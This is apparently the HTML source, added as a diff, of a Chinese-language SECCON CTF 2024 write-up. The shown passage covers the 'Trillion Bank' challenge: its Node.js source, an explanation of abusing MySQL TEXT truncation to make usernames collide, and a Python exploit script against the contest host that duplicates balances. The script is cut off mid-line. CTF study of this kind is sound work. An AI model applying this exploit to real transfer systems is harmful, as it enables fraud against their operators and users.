@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all這場那時候忘記在模考還是段考，反正沒打到QwQ回來補一下題，學到好多新東西，挖庫挖庫!!!   WebTrillion Bank這題的服務主要是一個簡單的銀行，初始只給你10塊，你要把它變成1_000_000_000_000元考點是MySQL一個特性，TEXT資料最大值為65535，Reference(link)   Source Code   1234567891011121">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SECCON CTF 2024 紀錄">
+<meta property="og:url" content="http://wha13.github.io/2024/12/01/seccon-ctf-2024/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all這場那時候忘記在模考還是段考，反正沒打到QwQ回來補一下題，學到好多新東西，挖庫挖庫!!!   WebTrillion Bank這題的服務主要是一個簡單的銀行，初始只給你10塊，你要把它變成1_000_000_000_000元考點是MySQL一個特性，TEXT資料最大值為65535，Reference(link)   Source Code   1234567891011121">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1NAtiKQyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1XdhotQ1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkyY3iKQkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJktmx57Jg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryNrbnK71g.png">
+<meta property="article:published_time" content="2024-12-01T18:51:00.000Z">
+<meta property="article:modified_time" content="2024-12-01T15:03:15.468Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Cryptography">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="Franklin–Reiter Attack">
+<meta property="article:tag" content="blockchain">
+<meta property="article:tag" content="web3">
+<meta property="article:tag" content="SECCON">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/r1NAtiKQyl.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SECCON CTF 2024 紀錄</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/23/win-pwn-basic/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/01/seccon-ctf-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&text=SECCON CTF 2024 紀錄"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&is_video=false&description=SECCON CTF 2024 紀錄"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SECCON CTF 2024 紀錄&body=Check out this article: http://wha13.github.io/2024/12/01/seccon-ctf-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&name=SECCON CTF 2024 紀錄&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&t=SECCON CTF 2024 紀錄"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trillion-Bank"><span class="toc-number">2.1.</span> <span class="toc-text">Trillion Bank</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tanuki-Udon"><span class="toc-number">2.2.</span> <span class="toc-text">Tanuki Udon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#self-ssrf"><span class="toc-number">2.3.</span> <span class="toc-text">self-ssrf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reiwa-rot13"><span class="toc-number">3.1.</span> <span class="toc-text">reiwa_rot13</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blockchain"><span class="toc-number">4.</span> <span class="toc-text">blockchain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trillion-Ether"><span class="toc-number">4.1.</span> <span class="toc-text">Trillion Ether</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SECCON CTF 2024 紀錄
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-01T18:51:00.000Z" class="dt-published" itemprop="datePublished">2024-12-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/Franklin%E2%80%93Reiter-Attack/" rel="tag">Franklin–Reiter Attack</a>, <a class="p-category" href="/tags/SECCON/" rel="tag">SECCON</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/blockchain/" rel="tag">blockchain</a>, <a class="p-category" href="/tags/nodejs/" rel="tag">nodejs</a>, <a class="p-category" href="/tags/web3/" rel="tag">web3</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這場那時候忘記在模考還是段考，反正沒打到QwQ<br>回來補一下題，學到好多新東西，挖庫挖庫!!!  </p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Trillion-Bank"><a href="#Trillion-Bank" class="headerlink" title="Trillion Bank"></a>Trillion Bank</h3><p>這題的服務主要是一個簡單的銀行，初始只給你10塊，你要把它變成<code>1_000_000_000_000</code>元<br>考點是MySQL一個特性，TEXT資料最大值為65535，<a target="_blank" rel="noopener" href="https://www.atlassian.com/data/databases/understanding-strorage-sizes-for-mysql-text-data-types">Reference(link)</a>  </p>
+<p><strong>Source Code</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fastify <span class="keyword">from</span> <span class="string">&quot;fastify&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> crypto <span class="keyword">from</span> <span class="string">&quot;node:crypto&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&quot;node:fs/promises&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> db <span class="keyword">from</span> <span class="string">&quot;./db.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> ?? <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;No flag&quot;</span>) ?? process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TRILLION</span> = <span class="number">1_000_000_000_000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">fastify</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">register</span>(<span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&quot;@fastify/jwt&quot;</span>), &#123;</span><br><span class="line">  <span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>),</span><br><span class="line">  <span class="attr">cookie</span>: &#123; <span class="attr">cookieName</span>: <span class="string">&quot;session&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">register</span>(<span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&quot;@fastify/cookie&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> names = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">auth</span> = <span class="keyword">async</span> (<span class="params">req, res</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> req.<span class="title function_">jwtVerify</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Unauthorized&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> name = <span class="title class_">String</span>(req.<span class="property">body</span>.<span class="property">name</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-z0-9]+$/</span>.<span class="title function_">test</span>(name)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Invalid name&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (names.<span class="title function_">has</span>(name)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Already exists&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  names.<span class="title function_">add</span>(name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [result] = <span class="keyword">await</span> db.<span class="title function_">query</span>(<span class="string">&quot;INSERT INTO users SET ?&quot;</span>, &#123;</span><br><span class="line">    name,</span><br><span class="line">    <span class="attr">balance</span>: <span class="number">10</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  res</span><br><span class="line">    .<span class="title function_">setCookie</span>(<span class="string">&quot;session&quot;</span>, <span class="keyword">await</span> res.<span class="title function_">jwtSign</span>(&#123; <span class="attr">id</span>: result.<span class="property">insertId</span> &#125;))</span><br><span class="line">    .<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Succeeded&quot;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/me&quot;</span>, &#123; <span class="attr">onRequest</span>: auth &#125;, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [&#123; <span class="number">0</span>: &#123; balance &#125; &#125;] = <span class="keyword">await</span> db.<span class="title function_">query</span>(<span class="string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>, [req.<span class="property">user</span>.<span class="property">id</span>]);</span><br><span class="line">    req.<span class="property">user</span>.<span class="property">balance</span> = balance;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">user</span>.<span class="property">balance</span> &gt;= <span class="variable constant_">TRILLION</span>) &#123;</span><br><span class="line">    req.<span class="property">user</span>.<span class="property">flag</span> = <span class="variable constant_">FLAG</span>; <span class="comment">// 💰</span></span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(req.<span class="property">user</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/transfer&quot;</span>, &#123; <span class="attr">onRequest</span>: auth &#125;, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> recipientName = <span class="title class_">String</span>(req.<span class="property">body</span>.<span class="property">recipientName</span>);</span><br><span class="line">  <span class="keyword">if</span> (!names.<span class="title function_">has</span>(recipientName)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Not found&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [&#123; <span class="number">0</span>: &#123; id &#125; &#125;] = <span class="keyword">await</span> db.<span class="title function_">query</span>(<span class="string">&quot;SELECT * FROM users WHERE name = ?&quot;</span>, [recipientName]);</span><br><span class="line">  <span class="keyword">if</span> (id === req.<span class="property">user</span>.<span class="property">id</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Self-transfer is not allowed&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> amount = <span class="built_in">parseInt</span>(req.<span class="property">body</span>.<span class="property">amount</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isFinite</span>(amount) || amount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Invalid amount&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> conn = <span class="keyword">await</span> db.<span class="title function_">getConnection</span>();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> conn.<span class="title function_">beginTransaction</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [&#123; <span class="number">0</span>: &#123; balance &#125; &#125;] = <span class="keyword">await</span> conn.<span class="title function_">query</span>(<span class="string">&quot;SELECT * FROM users WHERE id = ? FOR UPDATE&quot;</span>, [</span><br><span class="line">      req.<span class="property">user</span>.<span class="property">id</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; balance) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Invalid amount&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> conn.<span class="title function_">query</span>(<span class="string">&quot;UPDATE users SET balance = balance - ? WHERE id = ?&quot;</span>, [</span><br><span class="line">      amount,</span><br><span class="line">      req.<span class="property">user</span>.<span class="property">id</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">await</span> conn.<span class="title function_">query</span>(<span class="string">&quot;UPDATE users SET balance = balance + ? WHERE name = ?&quot;</span>, [</span><br><span class="line">      amount,</span><br><span class="line">      recipientName,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> conn.<span class="title function_">commit</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">await</span> conn.<span class="title function_">rollback</span>();</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    db.<span class="title function_">releaseConnection</span>(conn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">send</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;Succeeded&quot;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> html = <span class="keyword">await</span> fs.<span class="title function_">readFile</span>(<span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&quot;text/html; charset=utf-8&quot;</span>).<span class="title function_">send</span>(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(&#123; <span class="attr">port</span>: <span class="number">3000</span>, <span class="attr">host</span>: <span class="string">&quot;0.0.0.0&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>
+<p>判斷名字在不在是在服務寫個Set：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> names = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br></pre></td></tr></table></figure>
+<p>根據MySQL TEXT大小限制，如果註冊兩個user <code>a*65535+b</code> 及 <code>a*65535+c</code>，將導致MySQL塞進去的名字一樣是<code>a*65535</code>，又bypass js限制<br>利用這兩行不一致：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> conn.<span class="title function_">query</span>(<span class="string">&quot;UPDATE users SET balance = balance - ? WHERE id = ?&quot;</span>, [</span><br><span class="line">  amount,</span><br><span class="line">  req.<span class="property">user</span>.<span class="property">id</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">await</span> conn.<span class="title function_">query</span>(<span class="string">&quot;UPDATE users SET balance = balance + ? WHERE name = ?&quot;</span>, [</span><br><span class="line">  amount,</span><br><span class="line">  recipientName,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+<p>利用前面的特性註冊大約40的users，每次都分錢給<code>a*65535</code>，就會發生大家的錢集體翻倍這件事，超酷w  </p>
+<p><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">base_url=<span class="string">&#x27;http://trillion.seccon.games:3000&#x27;</span></span><br><span class="line">creds=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">name</span>):</span><br><span class="line">    web = req.post(base_url+<span class="string">&#x27;/api/register&#x27;</span>, json=&#123;<span class="string">&quot;name&quot;</span>:name&#125;)</span><br><span class="line">    cookie = web.headers.get(<span class="string">&#x27;set-cookie&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(web.text)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Got Cookie: <span class="subst">&#123;cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]:cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transfer</span>(<span class="params">cookie, amount</span>):</span><br><span class="line">    web=req.get(base_url+<span class="string">&#x27;/api/me&#x27;</span>, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Status: <span class="subst">&#123;web.text&#125;</span>&quot;</span>)</span><br><span class="line">    web=req.post(base_url+<span class="string">&#x27;/api/transfer&#x27;</span>, json=&#123;<span class="string">&quot;recipientName&quot;</span>:<span class="string">&#x27;q&#x27;</span>*<span class="number">65535</span>,<span class="string">&quot;amount&quot;</span>:<span class="built_in">str</span>(amount)&#125;, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Response: <span class="subst">&#123;web.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>():</span><br><span class="line">    web=req.get(base_url+<span class="string">&#x27;/api/me&#x27;</span>, cookies=creds[-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] FLAG: <span class="subst">&#123;web.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    creds.append(login(<span class="string">&#x27;q&#x27;</span>*(<span class="number">65535</span>+i)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>, <span class="number">0</span>, -<span 